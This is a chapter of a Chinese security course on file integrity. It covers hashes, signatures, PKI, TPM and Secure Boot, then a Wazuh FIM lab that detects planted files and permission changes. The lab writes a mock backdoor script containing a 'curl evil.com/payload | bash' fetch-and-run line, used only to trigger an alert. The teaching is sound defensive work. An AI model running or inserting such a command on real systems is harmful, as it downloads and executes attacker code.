# 第四章 能否发现主机文件发生异常变化？

## 4.1 本章要解决的问题

前三章，我们逐步建立了三道防线：

1. **第一章**：我们发现应用暴露在互联网上，存在可被利用的风险。
2. **第二章**：我们在攻击者和应用之间部署了 WAF，可以在 HTTP 层面拦截部分攻击。
3. **第三章**：我们在网络侧部署了 NIDS，可以观察到端口扫描等侦察行为。

但这三章有一个共同的前提：**攻击者的流量经过了我们的检测点**。WAF 检查 HTTP 请求，Suricata 检查它所能获得的网络流量。

CEO 现在问了一个更棘手的问题：

> **"如果攻击者绕过了 WAF，或者他的行为根本不产生网络流量——比如他直接在主机上修改了文件——我们能发现吗？"**

这个问题触及了主机安全的核心。如果攻击者已经进入了你的系统，他可能会：

- 植入后门程序。
- 修改配置文件以维持持久化访问。
- 篡改日志以抹除痕迹。
- 替换系统二进制文件。

这些行为可能不经过 WAF，也可能不产生 Suricata 能够捕获的网络流量。**如果我们只能检查网络和 Web 请求，而看不到主机内部发生了什么，那么我们对攻击者的可见性就存在巨大的盲区。**

本章结束后，你应该能够：

- 理解**完整性**在信息安全中的含义，以及为什么它不仅仅是一个理论概念。
- 解释散列函数、数字签名、PKI 和 GPG 在文件完整性验证中的作用。
- 理解可信计算（TPM、Secure Boot）如何从硬件层面建立信任链。
- 理解 **HIDS（Host-based Intrusion Detection System）** 的工作位置和检测方式。
- 解释 Wazuh Agent 中 **FIM（File Integrity Monitoring）** 的工作原理、基线机制和告警类型。
- 通过文件篡改对照实验，验证 FIM 是否能够检测到文件变化。
- 从 Wazuh Manager 的 FIM 告警中提取关键证据并解释其含义。
- 理解文件变化告警本身不能证明恶意行为，以及 FIM 的能力边界。

## 4.2 完整性的理论基础

### 4.2.1 信息安全三要素：CIA

在信息安全领域，**CIA 三要素**是理解所有安全控制的基础：

- **Confidentiality（机密性）**：确保信息只被授权的人访问。例如，加密防止窃听，访问控制防止未授权读取。
- **Integrity（完整性）**：确保信息没有被未授权地篡改。例如，散列校验检测文件被修改，数字签名确认数据来源可信。
- **Availability（可用性）**：确保授权用户在需要时能够访问信息。例如，冗余系统防止单点故障，DDoS 防护确保服务不中断。

本章聚焦于**完整性**。

完整性的核心问题是：**你怎么知道一个文件没有被篡改过？**

如果攻击者修改了系统上的某个文件，但没有留下任何可见的痕迹，那么即使你"看到"了这个文件，你也不能信任它。这就是完整性问题的本质——不是文件是否存在，而是文件是否还是原来那个文件。

### 4.2.2 散列函数：文件的"数字指纹"

回答"文件是否被篡改"最直接的方法，是给文件计算一个**散列值（Hash）**，也就是文件的"数字指纹"。

**散列函数**是一类将任意长度的输入映射为固定长度输出的数学函数。常见的散列函数包括：

| 散列函数 | 输出长度 | 安全性 |
|---------|---------|--------|
| MD5 | 128 位 | 已被破解，不应用于安全场景 |
| SHA-1 | 160 位 | 已被碰撞攻击，已弃用 |
| SHA-256 | 256 位 | 当前安全标准 |
| SM3 | 256 位 | 国密标准，等同于 SHA-256 安全级别 |

散列函数有两个关键属性，使其能够用于完整性验证：

1. **确定性**：同样的输入总是产生同样的输出。如果文件没有变化，散列值就不变。
2. **抗碰撞性**：很难找到两个不同的输入产生相同的输出。如果攻击者修改了文件，他很难让新的散列值与旧的相同。

因此，**只要文件发生了哪怕一个字节的修改，其散列值就会发生显著变化**。这就是所谓的"雪崩效应"。

实际操作中，我们可以这样验证一个文件的完整性：

```bash
# 计算文件的 SHA-256 散列值
$ shasum -a 256 important_file.txt
a1b2c3d4e5f6...  important_file.txt

# 如果文件被修改（哪怕只是增加了一个空格）
$ shasum -a 256 important_file.txt
f6e5d4c3b2a1...  important_file.txt
# 散列值完全不同 → 文件已被篡改
```

但散列函数只能告诉你"文件变了"。它不能告诉你**谁改的**、**什么时候改的**、**是不是合法的修改**。要回答这些问题，需要更强的机制——数字签名。

### 4.2.3 数字签名：确认来源和完整性

散列函数解决了"文件是否被篡改"的问题，但它没有解决另一个问题：**这个文件真的是它声称的那个人发布的吗？**

假设你从网上下载了一个软件，计算了它的散列值，和网站上公布的散列值一致。这只能说明文件在发布之后没有被篡改。但如果攻击者在发布环节就替换了文件和散列值呢？

**数字签名**同时解决了完整性和来源认证两个问题。

数字签名基于**公钥密码学**（非对称密码学）。其核心思想是：

- 每个人拥有一对密钥：**私钥**（自己保管）和**公钥**（公开）。
- 私钥用于**签名**：对数据计算签名，只有持有私钥的人才能生成。
- 公钥用于**验证**：任何人都可以用公钥验证签名是否正确。
- 从公钥推导不出私钥（这是 RSA、ECC、SM2 等算法的数学基础）。

```
签名者（持有私钥）               验证者（持有公钥）
       │                                │
       │  对文件计算散列
       │  用私钥加密散列值 → 签名
       │────────── 文件 + 签名 ──────────→│
       │                                │
       │                    用公钥解密签名，得到散列值 A
       │                    对文件重新计算散列值 B
       │                    比较 A 和 B：
       │                    A == B → 签名有效（文件完整且来源可信）
       │                    A != B → 签名无效（文件被篡改或来源不可信）
```

在 Java 中使用 Bouncy Castle 库进行 ECDSA 签名验证的示例：

```java
byte[] data      = Files.readAllBytes(Path.of(args[0])); // 原始文件
byte[] signature = Files.readAllBytes(Path.of(args[1])); // 签名（二进制）
byte[] pubKeyDer = Files.readAllBytes(Path.of(args[2])); // 公钥（X.509 编码）

PublicKey publicKey = KeyFactory
    .getInstance("EC", "BC")
    .generatePublic(new X509EncodedKeySpec(pubKeyDer));

Signature verifier = Signature.getInstance("SHA256withECDSA", "BC");
verifier.initVerify(publicKey);
verifier.update(data);

boolean valid = verifier.verify(signature);
System.out.println("签名验证结果: " + (valid ? "有效" : "无效"));
```

**验证结果的含义：**

- **"有效"**：文件自签名以来没有被篡改，且签名确实由该公钥对应的私钥持有者生成。
- **"无效"**：要么文件被篡改了，要么签名不是由该私钥生成的，或者两者皆是。

但这里还存在一个关键问题：**你拿到的公钥，真的是它声称的那个人的吗？**

### 4.2.4 PKI：公钥的信任问题

这就是 **PKI（Public Key Infrastructure，公钥基础设施）** 要解决的问题。

假设你访问一个 HTTPS 网站 `https://example.com`，服务器向你提供了一个公钥。如果没有可信的验证机制，攻击者可以冒充该网站，提供自己的公钥。即使你成功用这个公钥建立了加密连接，你连接的也可能是攻击者的服务器。

PKI 通过**数字证书**和**证书颁发机构（CA）** 建立公钥与身份之间的可信关联：

```
根 CA（自签名，被操作系统/浏览器预置信任）
    │
    ├── 签发 → 中间 CA
    │              │
    │              └── 签发 → example.com 的证书
    │
    └── 签发 → 另一个中间 CA
                   │
                   └── 签发 → another-site.com 的证书
```

当浏览器访问 `https://example.com` 时：

1. 服务器提供其证书（包含公钥和身份信息）。
2. 浏览器验证证书的签名链，追溯到预置信任的根 CA。
3. 浏览器检查证书是否适用于当前域名、是否在有效期内。
4. 验证通过后，继续执行 TLS 握手，建立加密连接。

**需要注意**：现代 HTTPS 通常不会直接用服务器证书中的公钥加密所有通信数据。证书主要用于认证服务器身份，TLS 再通过密钥交换（如 ECDHE）建立会话密钥。

**PKI 的核心组件：**

| 组件 | 作用 |
|------|------|
| 公钥与私钥 | 私钥由持有者保护，公钥公开。用于签名、验证，以及在适用的算法中进行加密或密钥交换 |
| 数字证书 | 将身份信息与公钥关联，由 CA 进行数字签名 |
| 证书颁发机构（CA） | 按照验证流程签发证书，建立公钥与身份之间的可信关联 |
| 证书链 | 通过中间 CA 和根 CA 建立信任关系。操作系统或浏览器预置信任根证书 |
| 证书验证与撤销 | 检查签名、有效期、用途、域名等，并在适用时检查证书是否已被撤销 |

### 4.2.5 GPG：OpenPGP 的开源实现

**GPG（GNU Privacy Guard）** 是 OpenPGP 标准（RFC 4880）的开源实现，提供数据的加密与数字签名能力。

GPG 的历史本身就是密码学走向开放和普及的缩影：

- **1991 年**：Phil Zimmermann 发布 PGP（Pretty Good Privacy），首个面向大众的公钥加密软件。
- **1993 年**：因美国"密码出口管制"被调查，Zimmermann 把 PGP 源码印成书出版——书籍不受出口管制限制。
- **1996 年**：IETF 制定 OpenPGP 标准（RFC 4880），统一了格式，让不同 PGP 实现可以互通。
- **1997 年**：完全自由开源的 OpenPGP 实现成为 Linux 生态的事实标准并沿用至今。

GPG 在实际系统中最典型的应用是 **Linux 内核源码签名验证**。

Linux 内核分发时附带的 `.sign` 文件，就是维护者用 GPG 私钥对源码包做的签名。它的作用只有一个：**让你确认下载的文件确实来自内核维护者，且没有被任何人篡改过**。

```bash
# 从密钥服务器检索并导入内核维护者的公钥
# 注意：这一步只是"按邮箱地址检索公钥"，不包含来源认证
$ gpg --locate-keys torvalds@kernel.org gregkh@kernel.org

# 查看已导入的公钥
$ gpg -k

# 验证内核源码包的签名
$ gpg --verify linux-7.2.8.tar.sign
```

GPG 验证的关键安全点：**验证签名的前提是公钥可信**。如果你从不可信的来源获取了公钥，攻击者可以用自己的密钥对篡改后的文件签名，而你仍然会认为签名"有效"。

### 4.2.6 完整性在现实中的应用

完整性验证在软件工程中有广泛的应用：

- **Ubuntu ISO 镜像**：Ubuntu 发布页面同时提供 ISO 文件的 SHA256 散列值，用于验证下载完整性。
- **Linux 内核**：提供 GPG 签名文件（`.sign`），用于验证源码包的来源和完整性。
- **软件包管理器**：APT、YUM、npm 等都使用签名验证软件包的完整性，防止供应链攻击。
- **代码签名**：macOS Gatekeeper、Windows SmartScreen 验证应用签名的有效性。

**一个重要的观察**：所有这些机制都只解决"文件是否被篡改"的问题。它们不负责监控文件**什么时候**被篡改、**谁**篡改的、以及篡改的**频率**。而这正是文件完整性监控（FIM）要解决的问题。

## 4.3 从密码学完整性到运行时完整性

### 4.3.1 可信计算：信任链的思想

密码学方法解决了"文件是否被篡改"的事后验证问题。但在实际的安全运营中，我们需要的不仅仅是事后的被动验证，而是**持续的、自动化的监控**。

**可信计算（Trusted Computing）** 的核心思想可以用一句话概括：

> 信任不能凭空产生，必须从一个可信的起点逐级建立。

可信计算通过"信任根 → 信任链 → 度量与报告"的机制，让系统每一级的启动过程可度量、可验证、可证明。

### 4.3.2 TPM：硬件信任根

**TPM（Trusted Platform Module，可信平台模块）** 是焊在主板上的专用安全芯片，本质是一个带防篡改能力的密码协处理器。

由 TCG（可信计算组织）制定规范，经历了 TPM 1.2 到 TPM 2.0 的演进。TPM 2.0 在算法选择、密钥层级和使用灵活性上做了大幅扩展，是当前主流系统的标准配置。

**TPM 的核心功能：**

| 功能 | 说明 |
|------|------|
| **PCR 度量寄存器** | 保存启动链各级的度量哈希。关键是"只增不改"——新值只能通过 `PCR_new = hash(PCR_old || 度量值)` 追加，无法直接写入任意值 |
| **安全密钥存储** | 平台密钥（EK、SRK）和应用密钥都在芯片内生成和保存，私钥永远不离开芯片 |
| **密封（Sealing）** | 把密钥与一组 PCR 值绑定——只有当平台处于预期状态时密钥才释放 |
| **远程证明（Remote Attestation）** | 平台用身份密钥对当前 PCR 值签名，远程服务器验证后判断"这台机器是否运行着预期版本的固件和系统" |
| **密码运算** | 芯片内完成 RSA/ECC 签名、加解密、真随机数生成 |

**典型使用场景：**

- **Windows BitLocker**：磁盘加密密钥密封进 TPM，开机引导链完整才自动解锁。
- **Linux IMA/EVM**：IMA 在内核层对文件做完整性度量并 extend 进 PCR。
- **远程证明与云安全**：服务器向平台方证明自身固件/系统状态可信。

### 4.3.3 Secure Boot：信任链的启动级验证

Secure Boot 是可信计算"信任链"思想在 UEFI 启动流程中的直接落地。

**UEFI（Unified Extensible Firmware Interface）** 是定义操作系统与固件之间接口的行业标准，规定了固件如何初始化硬件、如何把控制权交给引导程序、以及引导程序如何调用固件服务。

UEFI 启动流程（简化）：

```
上电
  → UEFI 固件（内置公钥）
      → 验证引导加载程序（Bootloader）签名
          → 验证内核签名
              → 操作系统启动
```

每一级都验证下一级的数字签名，通过才移交控制权。如果某一级的签名验证失败，启动链就会中断。

**Microsoft 与 Secure Boot 的普及：** Windows 8 起把支持 Secure Boot 作为 OEM 认证要求，是 Secure Boot 大规模普及的主要推动力。同时，Microsoft 运营 UEFI 签名数据库（UEFI CA）并为 Linux 生态的 shim 签名。

Linux 发行版通过 **shim 机制** 解决"Linux 引导程序没有 Microsoft 签名"的问题：shim 由 Microsoft 签名，shim 再信任各发行版自己的密钥，实现 Linux 在 Secure Boot 下的合法启动。

### 4.3.4 Bootkit 与 Rootkit

理解了 Secure Boot 和可信计算的保护机制，就可以理解它们防御的是什么：

- **Bootkit**：恶意代码隐藏在启动链中（引导程序、MBR、UEFI 固件），在操作系统加载**之前**就已经运行。
- **Rootkit**：核心特征是藏在系统底层，隐藏自己的进程、文件、网络连接和系统痕迹，让杀毒软件和安全分析看不到它。

Secure Boot 与可信计算把 bootkit 和 rootkit 的攻击门槛大幅抬高，因为攻击者需要绕过签名验证才能植入恶意代码。但这不意味着它们完全免疫——如果攻击者获取了签名密钥，或者利用了启动链中某个已签名的合法组件的漏洞，仍然可能绕过这些保护。

### 4.3.5 从理论到实践：我们实际能做什么？

以上介绍了完整的密码学和可信计算理论体系。但作为实习教学环境，我们无法在你的实验主机上配置 TPM 或 Secure Boot，也没有内核级的 IMA 模块。

**我们实际能做的是：使用开源的 HIDS 工具，在应用层实现对文件变化的持续监控。**

这正是 Wazuh Agent 的 FIM 能力所做的事情。它不依赖 TPM 硬件，也不介入启动链，但它能在操作系统运行时持续监控文件的变化，并在检测到异常时产生告警。

这就像从"理论上完美的安全模型"走向"实际可操作的防御手段"——不完美，但有用。

## 4.4 HIDS 与文件完整性监控

### 4.4.1 为什么需要 HIDS？

回顾一下我们已经部署的三层防御：

```
攻击者 → WAF → Juice Shop → Suricata (NIDS)
```

| 安全控制 | 检测层面 | 能检测什么 | 不能检测什么 |
|----------|---------|-----------|-------------|
| WAF | HTTP 应用层 | SQL 注入、XSS、目录遍历等 Web 攻击 | 非 HTTP 流量、主机文件变化、进程行为 |
| NIDS（Suricata） | 网络层 | 端口扫描、网络侦察、部分协议级攻击 | 加密流量（如果没有密钥）、本地文件操作 |

这两层防御有一个共同的特征：**它们都在检查"传输中的数据"**——网络包、HTTP 请求、响应。

但攻击者不一定只通过网络来破坏系统。一旦攻击者获得了主机的访问权限（无论通过漏洞利用、凭证窃取还是社会工程），他可以直接在主机上操作：

- 创建后门文件。
- 修改配置文件。
- 替换系统命令（如用恶意的 `ls` 替换原来的 `ls`）。
- 删除日志以抹除痕迹。

这些操作可能不经过 WAF，也不产生 Suricata 能看到的网络流量。**如果我们只有 WAF 和 NIDS，对主机内部发生的事就完全是盲区。**

这就是 **HIDS（Host-based Intrusion Detection System，基于主机的入侵检测系统）** 要解决的问题。

### 4.4.2 HIDS 的检测能力

HIDS 部署在受监控的主机上，从主机内部观察各种安全事件：

```
┌─────────────────────────────────────────┐
│            受监控主机                     │
│                                         │
│  ┌──────────────┐    ┌───────────────┐  │
│  │ Juice Shop   │    │ Wazuh Agent   │  │
│  │ (业务应用)    │    │ (HIDS)        │  │
│  │              │    │               │  │
│  │  ┌────────┐  │    │ • 文件完整性   │  │
│  │  │ 文件   │◄─┼────│   监控 (FIM)   │  │
│  │  └────────┘  │    │ • 日志采集     │  │
│  │              │    │ • 进程监控     │  │
│  └──────────────┘    │ • Rootkit 检测 │  │
│                      │ • 配置合规检查  │  │
│                      └───────┬───────┘  │
│                              │ 上报      │
└──────────────────────────────┼──────────┘
                               ▼
                       Wazuh Manager
                       (日志聚合与告警)
```

Wazuh Agent 是一个轻量级的代理程序，部署在受监控主机上，持续采集以下类型的数据：

| 功能 | 说明 |
|------|------|
| **文件完整性监控 (FIM)** | 监控关键文件的创建、修改、删除，记录散列值和属性变化 |
| **日志监控** | 收集和分析系统日志、应用日志、安全日志 |
| **进程监控** | 检测可疑进程的运行状态 |
| **Rootkit 检测** | 扫描系统中可能存在的 Rootkit 特征 |
| **配置合规检查 (SCA)** | 根据 CIS 等安全基线检查系统配置 |

### 4.4.3 FIM 的工作原理

**FIM（File Integrity Monitoring，文件完整性监控）** 是 HIDS 最核心的功能之一。它的原理并不复杂：

```
第 1 轮（基线扫描）              第 2 轮（对比扫描）
遍历监控目录 ───────→ 建立基线 ───────→ 再次遍历
                       ↓                  ↓
               记录每个文件的：       与基线逐条对比：
               • MD5/SHA256          • 文件不在基线 → 新增 (Rule 554)
               • SHA-1               • 散列值变了    → 修改 (Rule 550)
               • 权限/UID/GID         • 基线文件消失 → 删除 (Rule 553)
               • inode/mtime          • 属性变了      → 属性修改 (Rule 550)
               • 文件大小             ↓
               ↓                  发现差异 → 生成告警 → 上报 Manager
               无告警（仅建库）
```

**关键点：FIM 的检测依赖于"基线"。** 第一次扫描时，FIM 会为每个被监控的文件记录散列值和各项属性，建立初始基线。此时不会产生任何告警——它只是在"拍照"。后续的扫描会将当前状态与基线对比，只有**在基线建立之后发生的变化**才会触发告警。

这意味着：如果攻击者在 FIM 建立基线的同时篡改文件，该文件会被当作"正常状态"收录到基线中，不会产生告警。**篡改必须发生在基线建立之后，才能被检测为"变化"。**

### 4.4.4 Wazuh Agent 的 FIM 告警类型

Wazuh 对 FIM 事件定义了以下主要规则：

| 规则 ID | 级别 | 含义 |
|---------|------|------|
| 550 | 7 | 文件完整性校验和变化（文件内容或属性被修改） |
| 553 | 7 | 文件被删除 |
| 554 | 7 | 新增文件 |
| 555 | 7 | 文件权限变化 |
| 556 | 5 | 文件所有权变化 |
| 557 | 5 | 文件时间戳变化 |
| 558 | 5 | 文件大小变化 |
| 559 | 7 | 文件被移动 |

规则级别 7 属于较高关注度事件。这些告警本身只是"发生了变化"的记录——**文件被修改不等于系统被入侵**。合法的软件更新、管理员的配置变更、应用的正常运行都会触发这些告警。安全分析人员需要结合上下文来判断变化的性质。

## 4.5 实验：验证 Wazuh Agent 的文件完整性监控

### 4.5.1 实验环境架构

本次实验的 Docker Compose 定义了以下服务：

```yaml
# lesson-04/docker-compose.yml（节选）

services:
  # 后端应用
  juice-shop:
    image: bkimminich/juice-shop:latest
    container_name: juice-shop
    networks:
      - app-net
    volumes:
      - juice-shop-data:/juice-shop

  # Wazuh Manager（日志聚合端）
  wazuh-manager:
    image: wazuh/wazuh-manager:4.14.8
    container_name: wazuh-manager
    networks:
      - hids-net
    ports:
      - "1514:1514"  # Agent 与 Manager 通信
      - "1515:1515"  # Agent 注册端口

  # Wazuh Agent（HIDS，通过共享卷监控 Juice Shop 文件）
  wazuh-agent:
    image: wazuh/wazuh-agent:4.14.8
    container_name: wazuh-agent
    networks:
      - hids-net
    volumes:
      - juice-shop-data:/monitored/juice-shop  # 共享卷，监控目标
      - ./configs/ossec.conf:/wazuh-config-mount/etc/ossec.conf
    environment:
      - WAZUH_MANAGER=wazuh-manager
    depends_on:
      - wazuh-manager
```

**架构说明：**

- `juice-shop-data` 是一个 Docker 共享卷，同时挂载到 Juice Shop 容器（`/juice-shop`）和 Wazuh Agent 容器（`/monitored/juice-shop`）。
- Wazuh Agent 通过监控 `/monitored/juice-shop` 目录，间接监控 Juice Shop 容器的文件变化。
- Wazuh Agent 检测到变化后，通过 1514 端口将告警上报给 Wazuh Manager。
- **FIM 告警在 Manager 端聚合，不在 Agent 端直接输出**——这是 Wazuh 的集中式架构设计。

**网络拓扑：**

```
app-net                  hids-net
  │                        │
juice-shop ◄──共享卷──► wazuh-agent ──1514/tcp──► wazuh-manager
                         :1515 注册
```

`juice-shop` 和 `wazuh-agent` 不在同一个 Docker 网络中，它们通过共享卷实现文件监控，而不是通过网络直接通信。

### 4.5.2 FIM 配置详解

Wazuh Agent 的 FIM 配置通过挂载的 `ossec.conf` 实现：

```xml
<!-- lesson-04/configs/ossec.conf（FIM 部分） -->

<ossec_config>
  <client>
    <server>
      <address>wazuh-manager</address>
      <port>1514</port>
      <protocol>tcp</protocol>
    </server>
    <notify_time>10</notify_time>
    <time-reconnect>60</time-reconnect>
    <auto_restart>yes</auto_restart>
    <crypto_method>aes</crypto_method>
    <enrollment>
      <enabled>yes</enabled>
      <manager_address>wazuh-manager</manager_address>
      <port>1515</port>
    </enrollment>
  </client>

  <!-- 文件完整性监控 (FIM) -->
  <syscheck>
    <disabled>no</disabled>
    <frequency>30</frequency>         <!-- 每 30 秒扫描一次 -->
    <scan_on_start>yes</scan_on_start> <!-- 启动时立即扫描 -->

    <!-- 监控目录 -->
    <directories>/monitored/juice-shop</directories>

    <!-- 忽略频繁变化的目录 -->
    <ignore>/monitored/juice-shop/node_modules</ignore>
    <ignore>/monitored/juice-shop/logs</ignore>
    <ignore>/proc</ignore>
    <ignore>/sys</ignore>
  </syscheck>
</ossec_config>
```

**配置解读：**

- `<frequency>30</frequency>`：FIM 每 30 秒执行一次完整扫描。这意味着文件被修改后，最多需要等待 30 秒才能被检测到。
- `<scan_on_start>yes</scan_on_start>`：Agent 启动时立即执行首次扫描，建立初始基线。
- `<directories>`：指定要监控的目录。这里监控整个 `/monitored/juice-shop`。
- `<ignore>`：排除不需要监控的目录。`node_modules` 包含大量小文件，频繁扫描会影响性能；`logs` 目录持续产生新日志，会产生大量噪声。

**关于版本限制的说明**：Wazuh Agent 4.14 在容器化环境中不支持 `realtime` 和 `whodata` 等高级监控模式，只能使用 `scheduled`（定时扫描）模式。这意味着 FIM 不能实时检测文件变化，而是依赖定期扫描。这是一个**检测延迟**的问题——不是不能检测，而是需要等待下一次扫描周期。

### 4.5.3 启动实验环境

```bash
$ cd lesson-04
$ docker compose up -d
```

等待所有容器启动：

```bash
$ docker compose ps
NAME             STATUS
juice-shop       Up (healthy)
wazuh-manager    Up
wazuh-agent      Up
```

**验证 Agent 连接状态：**

```bash
$ docker compose logs wazuh-agent | grep -i "connected"
```

你应该能看到类似以下的输出：

```
wazuh-agent | yyyy-mm-dd HH:MM:SS root: INFO: Successfully connected to manager
```

如果 Agent 仍在尝试连接，等待几秒后重试。

### 4.5.4 等待 FIM 基线扫描完成

**这是实验的关键前置条件。** 如果在基线扫描完成之前就篡改文件，可能出现以下情况：

- 篡改与基线扫描同时进行，文件被当作"正常状态"收录。
- 基线扫描尚未开始，文件变化暂时未被检测。

因此，我们先等待首次基线扫描完成：

```bash
$ docker compose logs wazuh-agent | grep "scan ended"
```

当你看到类似以下输出时，说明基线扫描已完成：

```
wazuh-agent | yyyy-mm-dd HH:MM:SS syscheck: INFO: (6009): File integrity monitoring scan ended.
```

也可以使用实验脚本自动等待：

```bash
$ ./attack.sh
```

脚本会等待最多 120 秒，直到看到 "scan ended" 日志为止。

### 4.5.5 实验一：创建可疑文件（新增文件检测）

**目标**：在监控目录中创建一个模拟后门的文件，验证 FIM 是否能够检测到"新增文件"事件。

```bash
# 在 wazuh-agent 容器中创建可疑目录和文件
$ docker exec wazuh-agent sh -c 'mkdir -p /monitored/juice-shop/tmp/.hidden'

$ docker exec wazuh-agent sh -c 'cat > /monitored/juice-shop/tmp/.hidden/backdoor.sh << EOF
#!/bin/bash
# Reverse shell simulation
curl http://evil.com/payload | bash
EOF'

$ docker exec wazuh-agent sh -c 'chmod +x /monitored/juice-shop/tmp/.hidden/backdoor.sh'
```

**等待下一次 FIM 扫描**（约 30 秒）：

```bash
# 等待新的扫描周期
$ sleep 35

# 或者等待 "scan ended" 日志出现
$ docker compose logs wazuh-agent | grep "scan ended" | tail -1
```

### 4.5.6 实验二：修改文件权限（属性变化检测）

**目标**：修改一个已有文件的权限，验证 FIM 是否能够检测到属性变化（即使文件内容没有改变）。

```bash
# 将 package.json 的权限从 644 修改为 777
$ docker exec wazuh-agent sh -c 'chmod 777 /monitored/juice-shop/package.json'
```

**等待下一次 FIM 扫描**：

```bash
$ sleep 35
```

### 4.5.7 查看 FIM 告警

**重要**：FIM 告警不在 Agent 端输出，而是在 Manager 端。这是 Wazuh 的集中式架构——Agent 负责采集和上报，Manager 负责解析和告警生成。

```bash
# 等待告警从 Agent 同步到 Manager
$ sleep 5

# 查看 Manager 的 FIM 告警
$ docker exec wazuh-manager sh -c "grep 'syscheck' /var/ossec/logs/alerts/alerts.json | tail -3"
```

你应该能看到类似以下的 JSON 告警：

```json
{
    "timestamp": "2026-10-02T05:14:39.355+0000",
    "rule": {
        "level": 7,
        "description": "Integrity checksum changed.",
        "id": "550",
        "mitre": {
            "id": ["T1565.001"],
            "tactic": ["Impact"],
            "technique": ["Stored Data Manipulation"]
        },
        "firedtimes": 3,
        "groups": ["ossec", "syscheck", "syscheck_entry_modified", "syscheck_file"]
    },
    "agent": {
        "id": "001",
        "name": "63e43fd43ec1",
        "ip": "172.20.0.3"
    },
    "manager": {
        "name": "d156ece1bea2"
    },
    "full_log": "File '/monitored/juice-shop/package.json' modified\nMode: scheduled\nChanged attributes: permission\nPermissions changed from 'rw-r--r--' to 'rwxrwxrwx'\n",
    "syscheck": {
        "path": "/monitored/juice-shop/package.json",
        "mode": "scheduled",
        "perm_before": "rw-r--r--",
        "perm_after": "rwxrwxrwx",
        "uid_after": "65532",
        "gid_after": "0",
        "md5_after": "f3ca1fc020cbabea8a2b48a6d269e39c",
        "sha1_after": "7975196e5bb00d799955e9d47a669a168e96077d",
        "sha256_after": "e582b8e132fb6fa82e10f496e8ee55c8d9617f4ba19fc50ad87547bf8d281d87",
        "gname_after": "root",
        "mtime_after": "2026-08-11T05:21:02",
        "inode_after": 134237,
        "changed_attributes": ["permission"],
        "event": "modified"
    },
    "decoder": {
        "name": "syscheck_integrity_changed"
    },
    "location": "syscheck"
}
```

### 4.5.8 告警字段解读

让我们逐字段分析这条告警，理解每个字段传达的安全信息：

| 字段 | 值 | 含义 |
|------|-----|------|
| `rule.level` | 7 | 告警级别（1-3 低，4-6 中，7-9 高），属于较高关注度事件 |
| `rule.id` | 550 | syscheck 的标准"完整性校验和变化"规则 |
| `rule.description` | Integrity checksum changed | 规则描述，说明文件完整性校验检测到变化 |
| `rule.firedtimes` | 3 | 这条规则已经命中 3 次，说明同类事件此前已发生过，不是孤立事件 |
| `rule.mitre` | T1565.001 / Impact / Stored Data Manipulation | 映射到 MITRE ATT&CK "存储数据操纵"，即攻击者篡改存储数据的手法 |
| `rule.groups` | syscheck, syscheck_entry_modified... | 规则所属分组，用于告警分类与过滤 |
| 合规字段 | pci_dss 11.5 / gdpr II_5.1.f / nist_800_53 SI.7 等 | 同时满足多个合规框架的完整性要求 |
| `agent.id` | 001 | 上报事件的 Agent 编号 |
| `agent.name` | 63e43fd43ec1 | Agent 所在容器的主机名（容器 ID） |
| `syscheck.path` | /monitored/juice-shop/package.json | 被修改的文件路径 |
| `syscheck.mode` | scheduled | 检测模式为定时扫描（非实时） |
| `syscheck.perm_before/after` | rw-r--r-- → rwxrwxrwx | 权限从 644 变为 777 |
| `syscheck.changed_attributes` | ["permission"] | 只有权限变了，文件内容没有变 |
| `syscheck.*_after` 散列 | md5/sha1/sha256 | 变更后的校验和，可用于与已知合法值比对 |
| `syscheck.mtime_after` | 2026-08-11 | 文件内容修改时间——注意它可能远早于本次实验 |
| `decoder` | syscheck_integrity_changed | 解码器名称 |
| `location` | syscheck | 数据来源模块 |

### 4.5.9 清理实验环境

完成实验后，清理攻击痕迹，以便后续重新执行：

```bash
$ docker exec wazuh-agent sh -c 'rm -rf /monitored/juice-shop/tmp/.hidden'
$ docker exec wazuh-agent sh -c 'chmod 644 /monitored/juice-shop/package.json'
```

或者完全清理整个实验环境：

```bash
# 在项目根目录执行
$ source lesson-04/tools.sh
$ clear
```

## 4.6 三层防御对比

现在我们有三种安全控制手段。让我们从 CISO 的视角，审视它们各自解决什么问题，不解决什么问题：

| 威胁类型 | WAF | NIDS (Suricata) | HIDS (Wazuh Agent) |
|----------|-----|-----------------|-------------------|
| SQL 注入 | ✅ 检测并拦截 | ❌ 不检测 HTTP 内容 | ❌ 不分析 Web 请求 |
| 端口扫描 | ❌ 不检测网络层 | ✅ 检测并告警 | ❌ 不捕获网络流量 |
| 文件篡改 | ❌ 不涉及文件系统 | ❌ 不监控主机文件 | ✅ 检测并告警 |
| 可疑进程 | ❌ 不可见 | ❌ 不可见 | ✅ 可监控 |
| Rootkit | ❌ 不可见 | ❌ 不可见 | ✅ 可扫描特征 |

**核心洞察**：没有任何一种安全控制能够覆盖所有威胁类型。WAF 不懂文件系统，Suricata 看不到加密流量和本地操作，Wazuh Agent 不分析 HTTP 请求内容。**这正是纵深防御（Defense in Depth）的意义所在——通过多层异构的安全控制，缩小攻击者的盲区。**

## 4.7 能力边界与局限性

### 4.7.1 文件变化 ≠ 恶意行为

这是本章最重要的一个概念：**FIM 告警只是"发生了变化"的记录，不是"被入侵了"的证据。**

以下合法操作同样会触发 FIM 告警：

- 开发者更新了应用代码。
- 系统管理员修改了配置文件。
- 应用自动生成了新的日志文件。
- 软件包管理器更新了系统文件。
- 容器重启时重新挂载了共享卷。

**安全分析人员需要结合上下文判断变化的性质**：

- 变化发生在什么时间？是否是业务窗口？
- 变化是由谁触发的？是否有变更工单？
- 变化的是哪些文件？是否是敏感文件（如二进制、配置、密钥）？
- 变化的模式是什么？单个文件的正常更新，还是大量文件同时变化？

### 4.7.2 监控范围有限

FIM 只监控配置中指定的目录。在我们的实验中：

- ✅ 监控：`/monitored/juice-shop`（整个 Juice Shop 目录）。
- ❌ 忽略：`node_modules`、`logs`、`/proc`、`/sys`。

如果攻击者在监控范围之外的目录创建文件（例如 `/tmp` 或 `/etc`），FIM **不会**产生告警。

**扩展思考**：如果你负责生产系统的 FIM 配置，你应该监控哪些目录？以下是一些常见选择：

| 目录 | 原因 |
|------|------|
| `/etc` | 系统配置，修改可能影响安全策略 |
| `/bin`, `/sbin`, `/usr/bin` | 系统命令，被替换意味着系统已被攻陷 |
| `/boot` | 启动文件，被篡改可能影响启动链 |
| Web 应用根目录 | 应用代码，被修改可能植入后门 |
| 用户家目录 | SSH 密钥、bash 配置等持久化入口 |

### 4.7.3 检测延迟

实验配置中 `<frequency>30</frequency>` 意味着 FIM 每 30 秒扫描一次。因此：

- 文件被修改后，最多需要等待 **30 秒** 才能被检测到。
